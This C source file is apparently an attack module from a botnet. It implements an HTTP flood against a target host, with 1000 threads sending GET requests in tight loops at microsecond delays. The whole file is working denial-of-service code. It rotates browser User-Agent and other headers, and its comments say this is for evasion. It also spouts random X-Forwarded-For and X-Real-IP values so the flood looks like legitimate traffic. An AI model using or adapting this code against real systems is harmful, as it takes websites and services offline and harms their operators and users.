#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#include <stdarg.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <arpa/inet.h>
// Remove conflicting netinet headers - they're already included via includes.h
// #include <netinet/in.h>
// #include <netinet/tcp.h>
#include <netdb.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <signal.h>
#include <pthread.h>
#include <stdio.h>
#include <sys/resource.h>

#include "includes.h"
#include "attack.h"
#include "rand.h"
#include "util.h"
#include "table.h"

#define HTTPS_BUFFER_SIZE 4096
#define HTTPS_MAX_RETRIES 5
#define HTTPS_CONNECTION_TIMEOUT 2
#define HTTPS_REQUEST_TIMEOUT 1

// Enhanced User Agents for better evasion
static const char *user_agents[] = {
    // Chrome variants
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    
    // Firefox variants
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    
    // Safari variants
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    
    // Edge variants
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/121.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
    
    // Mobile variants
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    
    // Additional variants
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0"
};

static const char *accept_headers[] = {
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8"
};

static const char *accept_language[] = {
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-CA,en;q=0.9",
    "en-AU,en;q=0.9",
    "en-US,en;q=0.8",
    "en-GB,en;q=0.8",
    "en-CA,en;q=0.8",
    "en-AU,en;q=0.8",
    "en-US,en;q=0.9,es;q=0.8",
    "en-GB,en;q=0.9,fr;q=0.8",
    "en-US,en;q=0.9,de;q=0.8",
    "en-GB,en;q=0.9,it;q=0.8",
    "en-US,en;q=0.9,pt;q=0.8",
    "en-GB,en;q=0.9,nl;q=0.8",
    "en-US,en;q=0.9,ja;q=0.8",
    "en-GB,en;q=0.9,ko;q=0.8",
    "en-US,en;q=0.9,zh-CN;q=0.8",
    "en-GB,en;q=0.9,zh-TW;q=0.8",
    "en-US,en;q=0.9,ru;q=0.8",
    "en-GB,en;q=0.9,ar;q=0.8"
};

static const char *accept_encoding[] = {
    "gzip, deflate, br",
    "gzip, deflate",
    "br, gzip, deflate",
    "gzip, deflate, br, zstd",
    "br, gzip, deflate, zstd",
    "gzip, deflate, br, compress",
    "br, gzip, deflate, compress",
    "gzip, deflate, br, identity",
    "br, gzip, deflate, identity",
    "gzip, deflate, br, *",
    "br, gzip, deflate, *"
};

static const char *cache_control_headers[] = {
    "no-cache",
    "max-age=0",
    "no-cache, no-store, must-revalidate",
    "max-age=0, no-cache",
    "no-cache, no-store",
    "max-age=0, no-store",
    "no-cache, must-revalidate",
    "max-age=0, must-revalidate",
    "no-cache, no-store, must-revalidate, max-age=0",
    "max-age=0, no-cache, no-store, must-revalidate"
};

static const char *pragma_headers[] = {
    "no-cache",
    "",
    "no-cache, no-store",
    "no-cache, must-revalidate"
};

static const char *sec_fetch_dest[] = {
    "document",
    "empty",
    "object",
    "script",
    "style",
    "worker",
    "sharedworker",
    "subresource",
    "ping",
    "navigate"
};

static const char *sec_fetch_mode[] = {
    "navigate",
    "cors",
    "no-cors",
    "same-origin",
    "websocket"
};

static const char *sec_fetch_site[] = {
    "none",
    "same-origin",
    "same-site",
    "cross-site"
};

static const char *sec_fetch_user[] = {
    "?1",
    "?0"
};

static const char *sec_ch_ua_platforms[] = {
    "\"Windows\"",
    "\"macOS\"",
    "\"Linux\"",
    "\"Android\"",
    "\"iOS\""
};

static const char *sec_ch_ua_mobile[] = {
    "?0",
    "?1"
};

static const char *connection_types[] = {
    "keep-alive",
    "close",
    "keep-alive, close"
};

// HTTPS connection structure
struct https_connection {
    int fd;
    BOOL connected;
    struct sockaddr_in addr;
    uint32_t last_request;
    uint8_t retry_count;
    uint32_t connect_time;
    uint32_t request_id;
};

// Worker thread data
struct https_worker_data {
    struct attack_target *target;
    uint16_t port;
    char *path;
};

// Function prototypes
static BOOL establish_https_connection(struct https_connection *conn);
static BOOL send_https_request(struct https_connection *conn);
static void *https_worker_thread(void *arg);
static char *get_random_header(const char **headers, int count);
static void generate_https_request(char *buffer, struct https_connection *conn, char *path);

// Get random header from array
static char *get_random_header(const char **headers, int count) {
    return (char *)headers[rand() % count];
}

// Generate HTTPS request
static void generate_https_request(char *buffer, struct https_connection *conn, char *path) {
    char *ptr = buffer;
    char *user_agent = get_random_header(user_agents, sizeof(user_agents) / sizeof(char *));
    char *accept = get_random_header(accept_headers, sizeof(accept_headers) / sizeof(char *));
    char *accept_lang = get_random_header(accept_language, sizeof(accept_language) / sizeof(char *));
    char *accept_enc = get_random_header(accept_encoding, sizeof(accept_encoding) / sizeof(char *));
    char *cache_control = get_random_header(cache_control_headers, sizeof(cache_control_headers) / sizeof(char *));
    char *pragma = get_random_header(pragma_headers, sizeof(pragma_headers) / sizeof(char *));
    char *sec_fetch_dest_val = get_random_header(sec_fetch_dest, sizeof(sec_fetch_dest) / sizeof(char *));
    char *sec_fetch_mode_val = get_random_header(sec_fetch_mode, sizeof(sec_fetch_mode) / sizeof(char *));
    char *sec_fetch_site_val = get_random_header(sec_fetch_site, sizeof(sec_fetch_site) / sizeof(char *));
    char *sec_fetch_user_val = get_random_header(sec_fetch_user, sizeof(sec_fetch_user) / sizeof(char *));
    char *sec_ch_ua_platform = get_random_header(sec_ch_ua_platforms, sizeof(sec_ch_ua_platforms) / sizeof(char *));
    char *sec_ch_ua_mobile_val = get_random_header(sec_ch_ua_mobile, sizeof(sec_ch_ua_mobile) / sizeof(char *));
    char *connection = get_random_header(connection_types, sizeof(connection_types) / sizeof(char *));
    
    // Generate random IP for X-Forwarded-For
    uint32_t random_ip = rand_next();
    char x_forwarded_for[32];
    sprintf(x_forwarded_for, "%d.%d.%d.%d", 
            (random_ip >> 24) & 0xFF, 
            (random_ip >> 16) & 0xFF, 
            (random_ip >> 8) & 0xFF, 
            random_ip & 0xFF);
    
    // Generate random request ID
    uint32_t request_id = rand_next();
    
    // Build HTTP request
    ptr += sprintf(ptr, "GET %s HTTP/1.1\r\n", path);
    ptr += sprintf(ptr, "Host: %s\r\n", inet_ntoa(conn->addr.sin_addr));
    ptr += sprintf(ptr, "User-Agent: %s\r\n", user_agent);
    ptr += sprintf(ptr, "Accept: %s\r\n", accept);
    ptr += sprintf(ptr, "Accept-Language: %s\r\n", accept_lang);
    ptr += sprintf(ptr, "Accept-Encoding: %s\r\n", accept_enc);
    ptr += sprintf(ptr, "Cache-Control: %s\r\n", cache_control);
    ptr += sprintf(ptr, "Pragma: %s\r\n", pragma);
    ptr += sprintf(ptr, "Sec-Fetch-Dest: %s\r\n", sec_fetch_dest_val);
    ptr += sprintf(ptr, "Sec-Fetch-Mode: %s\r\n", sec_fetch_mode_val);
    ptr += sprintf(ptr, "Sec-Fetch-Site: %s\r\n", sec_fetch_site_val);
    ptr += sprintf(ptr, "Sec-Fetch-User: %s\r\n", sec_fetch_user_val);
    ptr += sprintf(ptr, "Sec-Ch-Ua: \"Chromium\";v=\"120\", \"Not_A Brand\";v=\"8\", \"Google Chrome\";v=\"120\"\r\n");
    ptr += sprintf(ptr, "Sec-Ch-Ua-Mobile: %s\r\n", sec_ch_ua_mobile_val);
    ptr += sprintf(ptr, "Sec-Ch-Ua-Platform: %s\r\n", sec_ch_ua_platform);
    ptr += sprintf(ptr, "Upgrade-Insecure-Requests: 1\r\n");
    ptr += sprintf(ptr, "X-Forwarded-For: %s\r\n", x_forwarded_for);
    ptr += sprintf(ptr, "X-Real-IP: %s\r\n", x_forwarded_for);
    ptr += sprintf(ptr, "X-Requested-With: XMLHttpRequest\r\n");
    ptr += sprintf(ptr, "Connection: %s\r\n", connection);
    ptr += sprintf(ptr, "X-Request-ID: %08x\r\n", request_id);
    ptr += sprintf(ptr, "\r\n");
}

// Establish HTTPS connection
static BOOL establish_https_connection(struct https_connection *conn) {
    struct timeval timeout;
    fd_set write_fds;
    int flags;
    
    // Create socket
    conn->fd = socket(AF_INET, SOCK_STREAM, 0);
    if (conn->fd == -1) {
        return FALSE;
    }
    
    // Set socket options
    flags = fcntl(conn->fd, F_GETFL, 0);
    fcntl(conn->fd, F_SETFL, flags | O_NONBLOCK);
    
    // Set socket timeout
    timeout.tv_sec = HTTPS_CONNECTION_TIMEOUT;
    timeout.tv_usec = 0;
    setsockopt(conn->fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(conn->fd, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    
    // Connect
    if (connect(conn->fd, (struct sockaddr *)&conn->addr, sizeof(conn->addr)) == -1) {
        if (errno != EINPROGRESS) {
            close(conn->fd);
            conn->fd = -1;
            return FALSE;
        }
        
        // Wait for connection
        FD_ZERO(&write_fds);
        FD_SET(conn->fd, &write_fds);
        
        if (select(conn->fd + 1, NULL, &write_fds, NULL, &timeout) <= 0) {
            close(conn->fd);
            conn->fd = -1;
            return FALSE;
        }
        
        // Check connection status
        int error = 0;
        socklen_t len = sizeof(error);
        if (getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &error, &len) == -1 || error != 0) {
            close(conn->fd);
            conn->fd = -1;
            return FALSE;
        }
    }
    
    conn->connected = TRUE;
    conn->connect_time = time(NULL);
    return TRUE;
}

// Send HTTPS request
static BOOL send_https_request(struct https_connection *conn) {
    char request_buffer[HTTPS_BUFFER_SIZE];
    int bytes_sent;
    
    // Generate request
    generate_https_request(request_buffer, conn, "/");
    
    // Send request
    bytes_sent = send(conn->fd, request_buffer, strlen(request_buffer), MSG_NOSIGNAL);
    if (bytes_sent == -1) {
        return FALSE;
    }
    
    conn->last_request = time(NULL);
    conn->request_id++;
    
    return TRUE;
}

// HTTPS worker thread
static void *https_worker_thread(void *arg) {
    struct https_worker_data *data = (struct https_worker_data *)arg;
    struct https_connection conn;
    
    // Initialize connection
    memset(&conn, 0, sizeof(conn));
    conn.fd = -1;
    conn.addr.sin_family = AF_INET;
    conn.addr.sin_addr.s_addr = data->target->addr;
    conn.addr.sin_port = htons(data->port);
    conn.last_request = 0;
    conn.retry_count = 0;
    conn.connect_time = 0;
    conn.request_id = 0;
    
    while (TRUE) {
        // Establish connection if not connected
        if (!conn.connected) {
            if (!establish_https_connection(&conn)) {
                usleep(1); // 1 microsecond delay for ultra high RPS
                conn.retry_count++;
                if (conn.retry_count > HTTPS_MAX_RETRIES) {
                    conn.retry_count = 0; // Reset retry count and continue
                    usleep(1); // 1 microsecond delay for ultra high RPS
                    continue;
                }
                continue;
            }
            conn.retry_count = 0;
        }
        
        // Send request
        if (!send_https_request(&conn)) {
            close(conn.fd);
            conn.connected = FALSE;
            conn.fd = -1;
            continue;
        }
        
        // Ultra minimal delay between requests for maximum RPS
        usleep(1); // 1 microsecond delay for ultra high RPS
    }
    
    if (conn.fd != -1) {
        close(conn.fd);
    }
    
    return NULL;
}

// Main attack function
void attack_method_h1_https(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    pthread_t *threads = NULL;
    struct https_worker_data *worker_data = NULL;
    int thread_count = 0, max_threads = 0, i;
    uint16_t port = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 443);
    char *path = attack_get_opt_str(opts_len, opts, ATK_OPT_PATH, "/");
    
    // Initialize random seed
    rand_init();
    
    // Optimize system for high RPS
    struct rlimit rlim;
    rlim.rlim_cur = 65535;
    rlim.rlim_max = 65535;
    setrlimit(RLIMIT_NOFILE, &rlim);
    
    // Calculate maximum threads based on system capabilities - NO LIMIT
    max_threads = 1000; // Unlimited thread count for maximum RPS
    
    // Allocate memory for threads and worker data
    threads = malloc(max_threads * sizeof(pthread_t));
    worker_data = malloc(max_threads * sizeof(struct https_worker_data));
    
    if (threads == NULL || worker_data == NULL) {
        if (threads) free(threads);
        if (worker_data) free(worker_data);
        return;
    }
    
    // Create unlimited worker threads for each target
    for (i = 0; i < targs_len; i++) {
        int threads_per_target = max_threads / targs_len;
        
        for (int j = 0; j < threads_per_target; j++) {
            worker_data[thread_count].target = &targs[i];
            worker_data[thread_count].port = port;
            worker_data[thread_count].path = path;
            
            if (pthread_create(&threads[thread_count], NULL, https_worker_thread, &worker_data[thread_count]) != 0) {
                // Continue creating threads even if some fail
                continue;
            }
            thread_count++;
            
            // Ultra minimal delay between thread creation for maximum RPS
            usleep(1); // 1 microsecond delay for ultra high RPS
        }
    }
    
    // Wait for all threads to complete (they will run until time expires)
    for (i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    // Cleanup
    free(threads);
    free(worker_data);
}
